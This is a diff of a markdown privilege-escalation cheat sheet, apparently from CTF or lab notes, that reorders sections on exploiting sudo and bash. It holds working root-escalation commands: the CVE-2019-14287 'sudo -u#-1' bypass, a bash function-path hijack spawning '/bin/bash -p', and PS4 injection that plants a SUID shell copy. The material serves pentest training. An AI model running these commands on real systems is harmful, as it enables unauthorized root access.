@@ -64,6 +64,66 @@ $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/
 
 <hr class="sep-both">
 
+## Exploit sudo
+
+*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ⭐).
+
+<div class="row row-cols-md-2"><div>
+
+[![picklerick](../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
+
+Try to find commands that can be run with sudo
+
+```bash
+$ sudo -nl # test if you can sudo without a password
+$ sudo -l # if you can't, try with your password
+# -> if both cases, if you were successful
+# and there are some interesting stuff such as:
+Matching Defaults entries for [...]:
+    [...] # vulnerable env variables? (LD_PRELOAD...)
+
+User [...] may run the following commands on [...]:
+    (root) /bin/tar # see tar#sudo on GTFOBins
+```
+</div><div>
+
+**sudo before 1.8.28 (CVE-2019-14287)**
+
+[![agentsudoctf](../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)
+
+If a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.
+
+```bash
+$ sudo -u#-1 nc
+$ sudo -u#4294967295 nc
+```
+</div></div>
+
+<hr class="sep-both">
+
+## Environment
+
+<div class="row row-cols-md-2"><div>
+
+The environment refer to the environment variable, the file system, pretty much anything that a script/command/executable will use while running (ex: `sudo`).
+</div><div>
+
+**Bash versions <4.2-048**: it is possible to create functions named after a path, which allow us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.
+
+```bash
+function /some/path { /bin/bash -p; }
+export -f /some/path
+```
+
+**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.
+
+```bash
+$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
+```
+</div></div>
+
+<hr class="sep-both">
+
 ## Misconfigured permissions
 
 <div class="row row-cols-md-2"><div>
@@ -124,64 +184,6 @@ If the script **hand-made**, or **not on GTFOBins**, then you can use the comman
 
 * `strace script`: see every system call
 * `strings script`: extract every readable string, may not be installed
-</div></div>
-
-<hr class="sep-both">
-
-## Exploit sudo
-
-*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ⭐).
-
-<div class="row row-cols-md-2"><div>
-
-[![picklerick](../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
-
-Try to find commands that can be run with sudo
-
-```bash
-$ sudo -nl # test if you can sudo without a password
-$ sudo -l # if you can't, try with your password
-# -> if both cases, if you were successful
-# and there are some interesting stuff such as:
-Matching Defaults entries for [...]:
-    [...] # try to exploit values here (LD_PRELOAD...)
-
-User [...] may run the following commands on [...]:
-    (root) /bin/tar # see tar#sudo on GTFOBins
-```
-</div><div>
-
-**sudo before 1.8.28 (CVE-2019-14287)**
-
-[![agentsudoctf](../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)
-
-If a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.
-
-```bash
-$ sudo -u#-1 nc
-$ sudo -u#4294967295 nc
-```
-</div></div>
-
-<hr class="sep-both">
-
-## Exploit bash
-
-<div class="row row-cols-md-2"><div>
-
-**Bash versions <4.2-048**: it is possible to create functions named after a path, which allow us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.
-
-```bash
-function /some/path { /bin/bash -p; }
-export -f /some/path
-```
-</div><div>
-
-**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.
-
-```bash
-$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
-```
 </div></div>
 
 <hr class="sep-both">
